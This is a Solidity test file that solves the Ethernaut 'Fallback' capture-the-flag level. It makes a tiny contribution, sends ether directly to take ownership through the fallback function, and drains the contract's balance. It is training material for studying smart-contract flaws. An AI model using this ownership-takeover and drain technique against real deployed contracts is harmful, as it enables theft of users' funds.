pragma solidity ^0.8.19;

import "ds-test/test.sol";
import "../../src/Fallback/FallbackFactory.sol";
import "../../src/Ethernaut.sol";
import "../../src/test/utils/vm.sol";

contract FallbacksTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallback() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        // attack
        // contribute 1 wei
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);
        // send 1 wei to the contract without calling any function
        (bool milady,) = payable(address(ethernautFallback)).call{value: 1 wei}("");
        require(milady);
        // verify contract owner has been updated to calling/EOA address
        assertEq(ethernautFallback.owner(), eoaAddress);
        // withdraw from contract
        uint256 eoaBAl = eoaAddress.balance;
        ethernautFallback.withdraw();
        // verify EOA balance updated since we recieved the contracts ETH
        assertGt(eoaAddress.balance, eoaBAl);
        // verify contract balance is 0
        assertEq(address(ethernautFallback).balance, 0);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
